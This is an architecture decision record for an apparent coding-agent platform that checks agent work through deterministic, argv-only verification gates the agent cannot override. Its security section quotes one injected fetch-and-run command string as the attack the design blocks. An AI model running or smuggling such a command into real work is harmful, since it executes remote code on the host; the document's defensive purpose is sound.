# ADR 0004 — Deterministic verification

- **Status:** Accepted
- **Date:** 2026-09-19
- **Deciders:** Factory engineering

## Context

A coding agent's own report that it succeeded is not evidence. The product
requirement is stated as an engineering principle: *an LLM must never be trusted
to declare verification successful*.

The factory therefore needs a verification layer that is:

- owned by the factory, not by the agent or the repository;
- deterministic — the same inputs produce the same verdict;
- structured, so an API caller cannot smuggle shell syntax into a gate;
- per-gate attributable, so a failure identifies *which* gate failed;
- immune to the agent's prose.

Machinist's model is that the terminal state *is* the process result of one
command. That is not enough here: a run has a build gate and a test gate with
different exit codes, and the factory must distinguish "the agent failed" from
"the agent succeeded but the change is wrong".

## Decision

`internal/verification` implements named **profiles** of ordered **steps**, where
a step is:

```go
type Step struct {
    ID          string
    Argv        []string        // the ONLY execution form
    Dir         string          // relative, non-escaping
    Timeout     tomlx.Duration
    Mandatory   *bool           // default true
    Env         map[string]string
    Description string
}
```

Rules the implementation enforces:

1. **No `shell:"…"` form exists.** A step is an argument vector. Arbitrary shell
   strings are structurally impossible.
2. **The verdict comes from exit codes alone.** Stdout and stderr are recorded
   as evidence but can never change a pass into a fail, or the reverse. A test
   asserting this is part of the suite.
3. **Every mandatory gate must pass.** Optional gates are recorded but do not
   gate the result.
4. **All gates run**, even after one fails: knowing that four of five gates pass
   is more useful evidence than an early exit.
5. **A gate that cannot be executed fails.** An infrastructure error while
   running a gate is never a pass.
6. **Evidence is written for passing gates too.** A green build nobody can
   inspect is not evidence.
7. Paths are validated: `Dir` must be a relative path and must not contain `..`,
   so a profile cannot read outside the repository.

The factory result is computed in the workflow:

```go
if !verified.Result.Passed {
    state.status.State = StateVerificationFailed
}
```

There is no code path in which the agent's exit code, output, or self-assessment
can produce `SUCCEEDED`.

## Alternatives considered

| Alternative | Rejected because |
| --- | --- |
| Let the repository declare its own gates in a file it commits | The agent can edit that file, so it could relax its own gate. Repository-declared verification is a Phase 2 (`factory.yaml`) concern and must be operator-validated before it is trusted. |
| A single `verify.sh` per profile | Reintroduces shell strings and loses per-gate attribution and per-gate timeouts. |
| An LLM judge | Non-deterministic, and explicitly excluded by the design principles. |
| Reuse Machinist's runner | It executes one command and reports one terminal state; it has no profile, per-gate or mandatory/optional concept. |
| Treat agent exit code 0 as success | Exactly the failure mode CASE B exists to catch. |

## Consequences

**Positive**

- The distinction `agent_result = SUCCESS` / `verification_result = FAILED` /
  `factory_result = VERIFICATION_FAILED` is expressible and tested.
- Adding a gate is a configuration change with no code change.
- Per-gate timings and exit codes give a precise failure signal.
- Gates are portable: the same profile runs against any sandbox provider.

**Negative / accepted**

- Operators must express gates as argv, which is slightly more verbose than a
  shell string. This is a deliberate ergonomics-for-safety trade.
- Multi-command gates need a small script in the repository (for example
  `./build.sh`), which is the repository's own business.
- Verification currently runs once, after the agent. Bounded repair loops are
  Phase 2.

## Security implications

- **Structured argv removes a whole class of injection.** A caller cannot express
  `; curl evil | sh` as a "verification command" because there is nowhere to put
  it.
- **Gate output is redacted on write** through the artifact store's sink, because
  a repository's build can print anything it read from its environment.
- **Gates run inside the microVM** with the sandbox's own network policy, not on
  the factory host.
- **Repository-declared gates are not trusted yet.** The MVP's profiles come from
  operator configuration only; if a future `factory.yaml` supplies them, the
  operator must approve the resulting command set.
- Timeouts are per gate, so a hung gate cannot consume the whole run.

## Future implications

- Phase 2 candidate ranking is a direct consumer: the same profile runs against
  N cloned candidates and the results are compared. Ranking must use only
  deterministic signals, which the current model already provides.
- A `severity` or `weight` field would allow scoring without breaking the
  mandatory/optional contract.
- Gate-level history enables questions the product must eventually answer:
  which gate fails most often, which template produces the highest first-pass
  rate, and whether 8-way speculation beats one expensive attempt.
